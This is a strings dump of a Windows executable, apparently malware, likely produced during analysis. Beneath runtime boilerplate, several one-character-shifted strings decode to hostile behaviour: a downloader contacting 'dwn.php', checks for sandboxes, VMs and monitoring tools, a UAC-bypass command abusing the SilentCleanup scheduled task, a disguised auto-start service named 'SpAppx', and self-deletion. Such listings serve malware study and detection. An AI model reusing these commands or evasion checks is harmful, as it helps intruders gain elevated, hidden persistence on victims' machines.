[Strings]
nth  paddr      vaddr      len size section type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0    0x0000004d 0x0000004d 44  45           ascii   !This program cannot be run in DOS mode.\r\r\n$
1    0x000000d8 0x000000d8 4   5            ascii   Rich
2    0x000001e8 0x000001e8 5   6            ascii   .text
3    0x0000020f 0x0000020f 7   8            ascii   `.rdata
4    0x00000237 0x00000237 6   7            ascii   @.data
5    0x00000260 0x00000260 5   6            ascii   .rsrc
6    0x00000287 0x00000287 7   8            ascii   @.reloc
1011 0x00012f94 0x00413b94 14  15   .rdata  ascii   DsfbufQspdfttB
1012 0x00012fa4 0x00413ba4 16  17   .rdata  ascii   DsfbufEjsfdupszB
1013 0x00012fb8 0x00413bb8 20  21   .rdata  ascii   HfuXjoepxtEjsfdupszB
1014 0x00012fd0 0x00413bd0 32  33   .rdata  ascii   TFUVQ;Jotubmm!gjmf!jt!opu!fyjtu"
1015 0x00012ff8 0x00413bf8 51  52   .rdata  ascii   TFUVQ;!Jotubmm!eftujobujpo!gjmf!dsfbujoh!jt!gbjmfe"
1016 0x00013030 0x00413c30 74  75   .rdata  ascii   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
1017 0x0001307c 0x00413c7c 12  13   .rdata  ascii   SboepnTusjoh
1018 0x0001308c 0x00413c8c 4   5    .rdata  ascii   %s%s
1019 0x00013094 0x00413c94 4   5    .rdata  ascii   1650
1020 0x0001309c 0x00413c9c 21  22   .rdata  ascii   \EpxompbeQspd^!tubsu"
1021 0x000130b4 0x00413cb4 13  14   .rdata  ascii   /home/dwn.php
1022 0x000130c4 0x00413cc4 5   6    .rdata  ascii   %s?%s
1023 0x000130cc 0x00413ccc 22  23   .rdata  ascii   \EpxompbeQspd^!epxo>&t
1024 0x000130e4 0x00413ce4 7   8    .rdata  ascii   dwn.dat
1025 0x000130ec 0x00413cec 4   5    .rdata  ascii   %s%d
1026 0x000130f4 0x00413cf4 34  35   .rdata  ascii   \EpxompbeQspd^!QIQ!Gjmf!jt!gbjmfe"
1027 0x00013118 0x00413d18 59  60   .rdata  ascii   \SfbeGjmfGspnQbdlfu^!op!boz!npsf!sfbejoh!ebub!gspn!joufsofu
1028 0x00013154 0x00413d54 47  48   .rdata  ascii   \SfbeGjmfGspnQbdlfu^!sfbe!mfohui!gspn!tfswfs>&e
1029 0x00013184 0x00413d84 5   6    .rdata  ascii   %s\%s
1030 0x0001318c 0x00413d8c 44  45   .rdata  ascii   \SfbeGjmfGspnQbdlfu^!Gjmf!#&t#Pqfo!jt!Gbjmfe
1031 0x000131bc 0x00413dbc 4   5    .rdata  ascii   POST
1032 0x000131c8 0x00413dc8 44  45   .rdata  ascii   \TfoeIuuq^!JoufsofuPqfoX!jt!gbjmfe"!fssps>&y
1033 0x000131f8 0x00413df8 47  48   .rdata  ascii   \TfoeIuuq^!JoufsofuDpoofduB!jt!gbjmfe"!fssps>&y
1034 0x00013228 0x00413e28 47  48   .rdata  ascii   \TfoeIuuq^!IuuqPqfoSfrvftuB!jt!gbjmfe"!fssps>&y
1035 0x00013258 0x00413e58 16  17   .rdata  ascii   Host: %s\r\n%s\r\n%s
1036 0x0001326c 0x00413e6c 47  48   .rdata  ascii   \TfoeIuuq^!IuuqTfoeSfrvftuB!jt!gbjmfe"!fssps>&y
1037 0x0001329c 0x00413e9c 46  47   .rdata  ascii   \TfoeIuuq^!TfoeIuuq!jt!tvddfttgvmmz!dpnqmfufe"
1038 0x000132cc 0x00413ecc 11  12   .rdata  ascii   tcjfemm/emm
1039 0x000132d8 0x00413ed8 11  12   .rdata  ascii   bqj`mph/emm
1040 0x000132e4 0x00413ee4 13  14   .rdata  ascii   ejs`xbudi/emm
1041 0x000132f4 0x00413ef4 11  12   .rdata  ascii   qtupsfd/emm
1042 0x00013300 0x00413f00 11  12   .rdata  ascii   wndifdl/emm
1043 0x0001330c 0x00413f0c 10  11   .rdata  ascii   xqftqz/emm
1044 0x00013318 0x00413f18 8   9    .rdata  ascii   wcpyusbz
1045 0x00013324 0x00413f24 7   8    .rdata  ascii   wnuppmt
1046 0x0001332c 0x00413f2c 8   9    .rdata  ascii   wnsbxetl
1047 0x00013338 0x00413f38 10  11   .rdata  ascii   wnvtcnpvtf
1048 0x00013344 0x00413f44 5   6    .rdata  ascii   wnwtt
1049 0x0001334c 0x00413f4c 6   7    .rdata  ascii   wntdtj
1050 0x00013354 0x00413f54 6   7    .rdata  ascii   wnyofu
1051 0x0001335c 0x00413f5c 8   9    .rdata  ascii   wny`twhb
1052 0x00013368 0x00413f68 8   9    .rdata  ascii   wnnfndum
1053 0x00013374 0x00413f74 7   8    .rdata  ascii   eg6tfsw
1054 0x0001337c 0x00413f7c 11  12   .rdata  ascii   wcpytfswjdf
1055 0x00013388 0x00413f88 6   7    .rdata  ascii   wnihgt
1056 0x00013390 0x00413f90 31  32   .rdata  ascii   \Tfuvq^!Dpvme!opu!tobq!qspdftt/
1057 0x000133b0 0x00413fb0 17  18   .rdata  ascii   Qspdftt!obnf!;!&t
1058 0x000133c4 0x00413fc4 7   8    .rdata  ascii   mon.exe
1059 0x000133cc 0x00413fcc 9   10   .rdata  ascii   mon64.exe
1060 0x000133d8 0x00413fd8 12  13   .rdata  ascii   Sysinternals
1061 0x000133e8 0x00413fe8 34  35   .rdata  ascii   Tztjoufsobm!qspevdu!Qsdt!obnf!;!&t
1062 0x0001340c 0x0041400c 16  17   .rdata  ascii   Npevmf!obnf!;!&t
1063 0x00013420 0x00414020 39  40   .rdata  ascii   D;]xjoepxt]Tztufn43]Esjwfst]Wnnpvtf/tzt
1064 0x00013448 0x00414048 38  39   .rdata  ascii   D;]xjoepxt]Tztufn43]Esjwfst]wn4ehm/emm
1065 0x00013470 0x00414070 40  41   .rdata  ascii   D;]xjoepxt]Tztufn43]Esjwfst]wny`twhb/tzt
1066 0x0001349c 0x0041409c 35  36   .rdata  ascii   D;]xjoepxt]Tztufn43]wcpytfswjdf/fyf
1067 0x000134c0 0x004140c0 19  20   .rdata  ascii   WN!Gjmf!fyjtut!;!&t
1068 0x000134d4 0x004140d4 6   7    .rdata  ascii   WNXbsf
1069 0x000134dc 0x004140dc 10  11   .rdata  ascii   wjsuvbmcpy
1070 0x000134e8 0x004140e8 4   5    .rdata  ascii   wcpy
1071 0x000134f0 0x004140f0 4   5    .rdata  ascii   rfnv
1072 0x000134f8 0x004140f8 87  88   .rdata  ascii   IBSEXBSF]EFWJDFNBQ]Tdtj]Tdtj!Qpsu!3]Tdtj!Cvt!1]Ubshfu!Je!1]Mphjdbm!Voju!Je!1]Jefoujgjfs
1073 0x00013550 0x00414150 73  74   .rdata  ascii   TZTUFN]DvssfouDpouspmTfu]Fovn]TDTJ]Ejtl'Wfo`WNxbsf`'Qspe`WNxbsf`Wjsuvbm`T
1074 0x000135a0 0x004141a0 75  76   .rdata  ascii   TZTUFN]DvssfouDpouspmTfu]Dpouspm]DsjujdbmEfwjdfEbubcbtf]sppu$wnxwndjiptuefw
1075 0x000135ec 0x004141ec 53  54   .rdata  ascii   TZTUFN]DvssfouDpouspmTfu]Dpouspm]WjsuvbmEfwjdfEsjwfst
1076 0x00013624 0x00414224 34  35   .rdata  ascii   TPGUXBSF]WNXbsf-!Jod/]WNXbsf!Uppmt
1077 0x00013648 0x00414248 42  43   .rdata  ascii   TPGUXBSF]Psbdmf]WjsuvbmCpy!Hvftu!Beejujpot
1078 0x00013674 0x00414274 24  25   .rdata  ascii   IBSEXBSF]BDQJ]ETEU]WCPY`
1079 0x00013690 0x00414290 39  40   .rdata  ascii   TZTUFN]DpouspmTfu112]Tfswjdft]Ejtl]Fovn
1080 0x000136b8 0x004142b8 27  28   .rdata  ascii   IBSEXBSF]Eftdsjqujpo]Tztufn
1081 0x000136d4 0x004142d4 21  22   .rdata  ascii   TztufnCjptJogpsnbujpo
1082 0x000136ec 0x004142ec 16  17   .rdata  ascii   WjefpCjptWfstjpo
1083 0x00013700 0x00414300 32  33   .rdata  ascii   IBSEXBSF]Eftdsjqujpo]Tztufn]CJPT
1084 0x00013724 0x00414324 18  19   .rdata  ascii   TztufnNbovgbduvsfs
1085 0x00013738 0x00414338 17  18   .rdata  ascii   TztufnQspevduObnf
1086 0x0001374c 0x0041434c 58  59   .rdata  ascii   IBSEXBSF]EFWJDFNBQ]Tdtj]Tdtj!Qpsu!1]Tdtj!Cvt!1]Ubshfu!Je!1
1087 0x00013788 0x00414388 17  18   .rdata  ascii   Mphjdbm!Voju!Je!1
1088 0x0001379c 0x0041439c 18  19   .rdata  ascii   Fyjtu!sfhqbui!;!&t
1089 0x000137b0 0x004143b0 12  13   .rdata  ascii   &t]&t!..?!&t
1090 0x000137c0 0x004143c0 18  19   .rdata  ascii   Qdft!ovncfst!jt!&e
1091 0x000137d4 0x004143d4 19  20   .rdata  ascii   Dpvme!opu!sfbe!vso/
1092 0x000137e8 0x004143e8 26  54   .rdata  utf16le Coordinated Universal Time
1093 0x00013820 0x00414420 66  67   .rdata  ascii   Uif!ujnf!{pof!jt!Dppsejobufe!Vojwfstbm!Ujnf!)VUD*-!ep!opu!qspdffe/
1094 0x00013864 0x00414464 7   8    .rdata  ascii   /c del 
1095 0x00013870 0x00414470 7   8    .rdata  ascii    >> NUL
1096 0x00013878 0x00414478 7   8    .rdata  ascii   ComSpec
1097 0x00013880 0x00414480 24  25   .rdata  ascii   TfmgEfmfujoh!jt!dpnqmfuf
1098 0x0001389c 0x0041449c 11  12   .rdata  ascii   Fowjsponfou
1099 0x000138a8 0x004144a8 6   7    .rdata  ascii   xjoejs
1100 0x000138b0 0x004144b0 42  43   .rdata  ascii   Tfuvq;Pqfojoh!fowjsponfou!sfhlfz!jt!gbjmfe
1101 0x000138dc 0x004144dc 58  59   .rdata  ascii   Tfuvq;Dsfbujoh!sfhlfz!gps!tfswjdf!gbjmvsfbdujpot!jt!gbjmfe
1102 0x00013918 0x00414518 72  73   .rdata  ascii   dne!0d!tdiubtlt!0svo!0uo!]Njdsptpgu]Xjoepxt]EjtlDmfbovq]TjmfouDmfbovq!0j
1103 0x00013964 0x00414564 36  37   .rdata  ascii   \TFUVQ^VBD!czqbtt!fyfdvujpo!jt!hppe"
1104 0x0001398c 0x0041458c 26  27   .rdata  ascii   Qspdftt!tbgfuz!wbmvf!jt &g
1105 0x000139a8 0x004145a8 7   8    .rdata  ascii   udqwjfx
1106 0x000139b0 0x004145b0 9   10   .rdata  ascii   xjsftibsl
1107 0x000139bc 0x004145bc 12  13   .rdata  ascii   iuuqbobmz{fs
1108 0x000139cc 0x004145cc 8   9    .rdata  ascii   fuifsfbm
1109 0x000139d8 0x004145d8 7   8    .rdata  ascii   xjoqdbq
1110 0x000139e0 0x004145e0 46  47   .rdata  ascii   \Dpnnvojubujpo!Tbgfuz^!Dpvme!opu!tobq!qspdftt/
1111 0x00013a10 0x00414610 79  80   .rdata  ascii   \Dpnnvojubujpo!Tbgfuz^!Dpvme!opu!sfusjfwf!jogpsnbujpo!bcpvu!qspdfttft-!fyjujoh/
1112 0x00013a60 0x00414660 23  24   .rdata  ascii   Tfuvq;Qspdftt!obnf!;!&t
1113 0x00013a9f 0x0041469f 9   10   .rdata  ascii   AComments
1114 0x00013aac 0x004146ac 11  12   .rdata  ascii   CompanyName
1115 0x00013ab8 0x004146b8 15  16   .rdata  ascii   FileDescription
1116 0x00013ac8 0x004146c8 11  12   .rdata  ascii   FileVersion
1117 0x00013ad4 0x004146d4 12  13   .rdata  ascii   InternalName
1118 0x00013ae4 0x004146e4 14  15   .rdata  ascii   LegalCopyright
1119 0x00013af4 0x004146f4 15  16   .rdata  ascii   LegalTrademarks
1120 0x00013b04 0x00414704 16  17   .rdata  ascii   OriginalFilename
1121 0x00013b18 0x00414718 12  13   .rdata  ascii   PrivateBuild
1122 0x00013b28 0x00414728 11  12   .rdata  ascii   ProductName
1123 0x00013b34 0x00414734 14  15   .rdata  ascii   ProductVersion
1124 0x00013b44 0x00414744 12  13   .rdata  ascii   SpecialBuild
1125 0x00013b54 0x00414754 15  16   .rdata  ascii   OLESelfRegister
1126 0x00013b70 0x00414770 24  25   .rdata  ascii   \VarFileInfo\Translation
1127 0x00013b8c 0x0041478c 27  28   .rdata  ascii   \StringFileInfo\%04X%04X\%s
1128 0x00013ba8 0x004147a8 274 275  .rdata  ascii   dne!0d!npwf!#&t#!#&t#!'!td!dsfbuf!TqBqqy!tubsu>bvup!fssps>opsnbm!cjoqbui>#&t#!hspvq>TvqqpsuTzt!EjtqmbzObnf>#Tvqqpsujoh!Bqqy!gps!svoojoh!po!Xjoepxt!Tztufn#'td!eftdsjqujpo!TqBqqy!#Tvqqpsu!gps!jotubmmjoh!-!vtjoh!boe!nbobhjoh!pg!wbsjpvt!Bqqy!po!Xjoepxt!Tztufn#'td!tubsu!TqBqqy'$
1129 0x00013cbc 0x004148bc 55  56   .rdata  ascii   \TFUVQ^VBD!Fyfdvuf!gps!sfhjtufsjoh!tfswjdf!jt!opu!hppe"
1130 0x00013cf4 0x004148f4 51  52   .rdata  ascii   \TFUVQ^VBD!Fyfdvuf!gps!sfhjtufsjoh!tfswjdf!jt!hppe"
1131 0x00013d28 0x00414928 35  36   .rdata  ascii   TFUVQ!;!Sfhjtufs!tfswjdf!jt!gbjmvsf
1132 0x00013d4c 0x0041494c 34  35   .rdata  ascii   Tfuvq;Jotubmm!qsphsftt!jt!dpnqmfuf
1133 0x00013d70 0x00414970 12  13   .rdata  ascii   EfwQsjoufsJE
1134 0x00013d80 0x00414980 24  25   .rdata  ascii   Uif!Spbnjoh!gpmefs!jt!&t
1135 0x00013d9c 0x0041499c 15  16   .rdata  ascii   Tubsu!cfibwjps"
1136 0x00013dac 0x004149ac 6   7    .rdata  ascii   van=%d
1137 0x00013db4 0x004149b4 29  30   .rdata  ascii   Tfuvq;Epxompbe!&t!jt!dpnqmfuf
1138 0x00013dd4 0x004149d4 35  36   .rdata  ascii   \TFUVQ^DTJEM`DPNNPO`UFNQMBUFT!jt!&t
1139 0x00013df8 0x004149f8 6   7    .rdata  ascii   AppxUp
1140 0x00013e00 0x00414a00 7   8    .rdata  ascii   BSup.hf
1141 0x00013e08 0x00414a08 6   7    .rdata  ascii   %s\%s1
1142 0x00013e10 0x00414a10 7   8    .rdata  ascii   BCup.hf
1143 0x00013e18 0x00414a18 6   7    .rdata  ascii   %s\%s2
1144 0x00013e20 0x00414a20 6   7    .rdata  ascii   %s\%s0
1145 0x00013e28 0x00414a28 8   9    .rdata  ascii   Appx.exe
1146 0x00013e34 0x00414a34 5   6    .rdata  ascii   smart
1147 0x00013e3c 0x00414a3c 11  24   .rdata  utf16le mscoree.dll
1148 0x00013e54 0x00414a54 14  15   .rdata  ascii   CorExitProcess
1149 0x00013e7c 0x00414a7c 17  18   .rdata  ascii   Unknown exception
1150 0x00013f66 0x00414b66 45  92   .rdata  utf16le AR6002\r\n- floating point support not loaded\r\n
1151 0x00013fc8 0x00414bc8 41  84   .rdata  utf16le R6008\r\n- not enough space for arguments\r\n
1152 0x00014020 0x00414c20 43  88   .rdata  utf16le R6009\r\n- not enough space for environment\r\n
1153 0x00014078 0x00414c78 34  70   .rdata  utf16le R6010\r\n- abort() has been called\r\n
1154 0x000140c0 0x00414cc0 43  88   .rdata  utf16le R6016\r\n- not enough space for thread data\r\n
1155 0x00014118 0x00414d18 44  90   .rdata  utf16le R6017\r\n- unexpected multithread lock error\r\n
1156 0x00014178 0x00414d78 32  66   .rdata  utf16le R6018\r\n- unexpected heap error\r\n
1157 0x000141c0 0x00414dc0 40  82   .rdata  utf16le R6019\r\n- unable to open console device\r\n
1158 0x00014218 0x00414e18 52  106  .rdata  utf16le R6024\r\n- not enough space for _onexit/atexit table\r\n
1159 0x00014288 0x00414e88 37  76   .rdata  utf16le R6025\r\n- pure virtual function call\r\n
1160 0x000142d8 0x00414ed8 52  106  .rdata  utf16le R6026\r\n- not enough space for stdio initialization\r\n
1161 0x00014348 0x00414f48 52  106  .rdata  utf16le R6027\r\n- not enough space for lowio initialization\r\n
1162 0x000143b8 0x00414fb8 36  74   .rdata  utf16le R6028\r\n- unable to initialize heap\r\n
1163 0x00014404 0x00415004 30  62   .rdata  utf16le R6030\r\n- CRT not initialized\r\n
1164 0x00014448 0x00415048 98  198  .rdata  utf16le R6031\r\n- Attempt to initialize the CRT more than once.\nThis indicates a bug in your application.\r\n
1165 0x00014510 0x00415110 50  102  .rdata  utf16le R6032\r\n- not enough space for locale information\r\n
1166 0x00014578 0x00415178 246 494  .rdata  utf16le R6033\r\n- Attempt to use MSIL code from this assembly during native code initialization\nThis indicates a bug in your application. It is most likely the result of calling an MSIL-compiled (/clr) function from a native constructor or from DllMain.\r\n
1167 0x00014768 0x00415368 50  102  .rdata  utf16le R6034\r\n- inconsistent onexit begin-end variables\r\n
1168 0x000147d0 0x004153d0 14  30   .rdata  utf16le DOMAIN error\r\n
1169 0x000147f0 0x004153f0 12  26   .rdata  utf16le SING error\r\n
1170 0x0001480c 0x0041540c 13  28   .rdata  utf16le TLOSS error\r\n
1171 0x00014830 0x00415430 14  30   .rdata  utf16le runtime error 
1172 0x00014850 0x00415450 25  52   .rdata  utf16le Runtime Error!\n\nProgram: 
1173 0x00014884 0x00415484 22  46   .rdata  utf16le <program name unknown>
1174 0x000148c8 0x004154c8 36  74   .rdata  utf16le Microsoft Visual C++ Runtime Library
1175 0x00014914 0x00415514 6   7    .rdata  ascii   (null)
1176 0x0001491c 0x0041551c 6   14   .rdata  utf16le (null)
1177 0x00014951 0x00415551 7   8    .rdata  ascii   ( 8PX\a\b
1178 0x00014959 0x00415559 6   7    .rdata  ascii   700WP\a
1179 0x00014968 0x00415568 7   8    .rdata  ascii   \b`h````
1180 0x00014971 0x00415571 9   10   .rdata  ascii   xpxxxx\b\a\b
1181 0x000149b5 0x004155b5 5   6    .rdata  ascii   ('8PW
1182 0x000149be 0x004155be 5   6    .rdata  ascii   700PP
1183 0x000149d0 0x004155d0 17  18   .rdata  ascii   `h`hhh\b\b\axppwpp\b\b
1184 0x00014a02 0x00415602 6   14   .rdata  utf16le Aja-JP
1185 0x00014a10 0x00415610 5   12   .rdata  utf16le zh-CN
1186 0x00014a1c 0x0041561c 5   12   .rdata  utf16le ko-KR
1187 0x00014a28 0x00415628 5   12   .rdata  utf16le zh-TW
1188 0x00014a50 0x00415650 6   7    .rdata  ascii   Sunday
1189 0x00014a58 0x00415658 6   7    .rdata  ascii   Monday
1190 0x00014a60 0x00415660 7   8    .rdata  ascii   Tuesday
1191 0x00014a68 0x00415668 9   10   .rdata  ascii   Wednesday
1192 0x00014a74 0x00415674 8   9    .rdata  ascii   Thursday
1193 0x00014a80 0x00415680 6   7    .rdata  ascii   Friday
1194 0x00014a88 0x00415688 8   9    .rdata  ascii   Saturday
1195 0x00014ac4 0x004156c4 7   8    .rdata  ascii   January
1196 0x00014acc 0x004156cc 8   9    .rdata  ascii   February
1197 0x00014ad8 0x004156d8 5   6    .rdata  ascii   March
1198 0x00014ae0 0x004156e0 5   6    .rdata  ascii   April
1199 0x00014ae8 0x004156e8 4   5    .rdata  ascii   June
1200 0x00014af0 0x004156f0 4   5    .rdata  ascii   July
1201 0x00014af8 0x004156f8 6   7    .rdata  ascii   August
1202 0x00014b00 0x00415700 9   10   .rdata  ascii   September
1203 0x00014b0c 0x0041570c 7   8    .rdata  ascii   October
1204 0x00014b14 0x00415714 8   9    .rdata  ascii   November
1205 0x00014b20 0x00415720 8   9    .rdata  ascii   December
1206 0x00014b34 0x00415734 8   9    .rdata  ascii   MM/dd/yy
1207 0x00014b40 0x00415740 19  20   .rdata  ascii   dddd, MMMM dd, yyyy
1208 0x00014b54 0x00415754 8   9    .rdata  ascii   HH:mm:ss
1209 0x00014b98 0x00415798 6   14   .rdata  utf16le Sunday
1210 0x00014ba8 0x004157a8 6   14   .rdata  utf16le Monday
1211 0x00014bb8 0x004157b8 7   16   .rdata  utf16le Tuesday
1212 0x00014bc8 0x004157c8 9   20   .rdata  utf16le Wednesday
1213 0x00014bdc 0x004157dc 8   18   .rdata  utf16le Thursday
1214 0x00014bf0 0x004157f0 6   14   .rdata  utf16le Friday
1215 0x00014c00 0x00415800 8   18   .rdata  utf16le Saturday
1216 0x00014c74 0x00415874 7   16   .rdata  utf16le January
1217 0x00014c84 0x00415884 8   18   .rdata  utf16le February
1218 0x00014c98 0x00415898 5   12   .rdata  utf16le March
1219 0x00014ca4 0x004158a4 5   12   .rdata  utf16le April
1220 0x00014cb0 0x004158b0 4   10   .rdata  utf16le June
1221 0x00014cbc 0x004158bc 4   10   .rdata  utf16le July
1222 0x00014cc8 0x004158c8 6   14   .rdata  utf16le August
1223 0x00014cd8 0x004158d8 9   20   .rdata  utf16le September
1224 0x00014cec 0x004158ec 7   16   .rdata  utf16le October
1225 0x00014cfc 0x004158fc 8   18   .rdata  utf16le November
1226 0x00014d10 0x00415910 8   18   .rdata  utf16le December
1227 0x00014d34 0x00415934 8   18   .rdata  utf16le MM/dd/yy
1228 0x00014d48 0x00415948 19  40   .rdata  utf16le dddd, MMMM dd, yyyy
1229 0x00014d70 0x00415970 8   18   .rdata  utf16le HH:mm:ss
1230 0x00014d84 0x00415984 5   12   .rdata  utf16le en-US
1231 0x00014d96 0x00415996 7   8    .rdata  ascii   \a\b\t\n\v\f\r
1232 0x00014daf 0x004159af 95  96   .rdata  ascii    !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
1233 0x00014e10 0x00415a10 19  20   .rdata  ascii   GetCurrentPackageId
1234 0x00014e24 0x00415a24 12  26   .rdata  utf16le kernel32.dll
1235 0x00014e50 0x00415a50 13  14   .rdata  ascii   bad exception
1236 0x00014e60 0x00415a60 5   6    .rdata  ascii   e+000
1237 0x00014f0c 0x00415b0c 8   18   .rdata  utf16le ER32.DLL
1238 0x00014f20 0x00415b20 11  12   .rdata  ascii   MessageBoxW
1239 0x00014f2c 0x00415b2c 15  16   .rdata  ascii   GetActiveWindow
1240 0x00014f3c 0x00415b3c 18  19   .rdata  ascii   GetLastActivePopup
1241 0x00014f50 0x00415b50 25  26   .rdata  ascii   GetUserObjectInformationW
1242 0x00014f6c 0x00415b6c 23  24   .rdata  ascii   GetProcessWindowStation
1243 0x00015088 0x00415c88 33  68   .rdata  utf16le          (((((                  H
1244 0x0001528a 0x00415e8a 33  68   .rdata  utf16le          h((((                  H
1245 0x00015388 0x00415f88 34  70   .rdata  utf16le                                  H
1246 0x00015517 0x00416117 7   8    .rdata  ascii   \a\b\t\n\v\f\r
1247 0x00015530 0x00416130 95  96   .rdata  ascii    !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
1248 0x00015697 0x00416297 7   8    .rdata  ascii   \a\b\t\n\v\f\r
1249 0x000156b0 0x004162b0 95  96   .rdata  ascii    !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
1250 0x00015918 0x00416518 8   9    .rdata  ascii   __based(
1251 0x00015924 0x00416524 7   8    .rdata  ascii   __cdecl
1252 0x0001592c 0x0041652c 8   9    .rdata  ascii   __pascal
1253 0x00015938 0x00416538 9   10   .rdata  ascii   __stdcall
1254 0x00015944 0x00416544 10  11   .rdata  ascii   __thiscall
1255 0x00015950 0x00416550 10  11   .rdata  ascii   __fastcall
1256 0x0001595c 0x0041655c 9   10   .rdata  ascii   __clrcall
1257 0x00015968 0x00416568 6   7    .rdata  ascii   __eabi
1258 0x00015970 0x00416570 7   8    .rdata  ascii   __ptr64
1259 0x00015978 0x00416578 10  11   .rdata  ascii   __restrict
1260 0x00015984 0x00416584 11  12   .rdata  ascii   __unaligned
1261 0x00015990 0x00416590 9   10   .rdata  ascii   restrict(
1262 0x0001599c 0x0041659c 4   5    .rdata  ascii    new
1263 0x000159a4 0x004165a4 7   8    .rdata  ascii    delete
1264 0x000159c8 0x004165c8 8   9    .rdata  ascii   operator
1265 0x00015a50 0x00416650 9   10   .rdata  ascii   `vftable'
1266 0x00015a5c 0x0041665c 9   10   .rdata  ascii   `vbtable'
1267 0x00015a68 0x00416668 7   8    .rdata  ascii   `vcall'
1268 0x00015a70 0x00416670 8   9    .rdata  ascii   `typeof'
1269 0x00015a7c 0x0041667c 20  21   .rdata  ascii   `local static guard'
1270 0x00015a94 0x00416694 8   9    .rdata  ascii   `string'
1271 0x00015aa0 0x004166a0 18  19   .rdata  ascii   `vbase destructor'
1272 0x00015ab4 0x004166b4 28  29   .rdata  ascii   `vector deleting destructor'
1273 0x00015ad4 0x004166d4 29  30   .rdata  ascii   `default constructor closure'
1274 0x00015af4 0x004166f4 28  29   .rdata  ascii   `scalar deleting destructor'
1275 0x00015b14 0x00416714 29  30   .rdata  ascii   `vector constructor iterator'
1276 0x00015b34 0x00416734 28  29   .rdata  ascii   `vector destructor iterator'
1277 0x00015b54 0x00416754 35  36   .rdata  ascii   `vector vbase constructor iterator'
1278 0x00015b78 0x00416778 26  27   .rdata  ascii   `virtual displacement map'
1279 0x00015b94 0x00416794 32  33   .rdata  ascii   `eh vector constructor iterator'
1280 0x00015bb8 0x004167b8 31  32   .rdata  ascii   `eh vector destructor iterator'
1281 0x00015bd8 0x004167d8 38  39   .rdata  ascii   `eh vector vbase constructor iterator'
1282 0x00015c00 0x00416800 26  27   .rdata  ascii   `copy constructor closure'
1283 0x00015c1c 0x0041681c 15  16   .rdata  ascii   `udt returning'
1284 0x00015c30 0x00416830 5   6    .rdata  ascii   `RTTI
1285 0x00015c38 0x00416838 15  16   .rdata  ascii   `local vftable'
1286 0x00015c48 0x00416848 35  36   .rdata  ascii   `local vftable constructor closure'
1287 0x00015c6c 0x0041686c 6   7    .rdata  ascii    new[]
1288 0x00015c74 0x00416874 9   10   .rdata  ascii    delete[]
1289 0x00015c80 0x00416880 14  15   .rdata  ascii   `omni callsig'
1290 0x00015c90 0x00416890 26  27   .rdata  ascii   `placement delete closure'
1291 0x00015cac 0x004168ac 28  29   .rdata  ascii   `placement delete[] closure'
1292 0x00015ccc 0x004168cc 37  38   .rdata  ascii   `managed vector constructor iterator'
1293 0x00015cf4 0x004168f4 36  37   .rdata  ascii   `managed vector destructor iterator'
1294 0x00015d1c 0x0041691c 37  38   .rdata  ascii   `eh vector copy constructor iterator'
1295 0x00015d44 0x00416944 43  44   .rdata  ascii   `eh vector vbase copy constructor iterator'
1296 0x00015d70 0x00416970 26  27   .rdata  ascii   `dynamic initializer for '
1297 0x00015d8c 0x0041698c 32  33   .rdata  ascii   `dynamic atexit destructor for '
1298 0x00015db0 0x004169b0 34  35   .rdata  ascii   `vector copy constructor iterator'
1299 0x00015dd4 0x004169d4 40  41   .rdata  ascii   `vector vbase copy constructor iterator'
1300 0x00015e00 0x00416a00 42  43   .rdata  ascii   `managed vector copy constructor iterator'
1301 0x00015e2c 0x00416a2c 27  28   .rdata  ascii   `local static thread guard'
1302 0x00015e48 0x00416a48 17  18   .rdata  ascii    Type Descriptor'
1303 0x00015e5c 0x00416a5c 27  28   .rdata  ascii    Base Class Descriptor at (
1304 0x00015e78 0x00416a78 18  19   .rdata  ascii    Base Class Array'
1305 0x00015e8c 0x00416a8c 28  29   .rdata  ascii    Class Hierarchy Descriptor'
1306 0x00015eac 0x00416aac 25  26   .rdata  ascii    Complete Object Locator'
1307 0x00015ec8 0x00416ac8 6   7    .rdata  ascii   1#SNAN
1308 0x00015ed0 0x00416ad0 5   6    .rdata  ascii   1#IND
1309 0x00015ed8 0x00416ad8 5   6    .rdata  ascii   1#INF
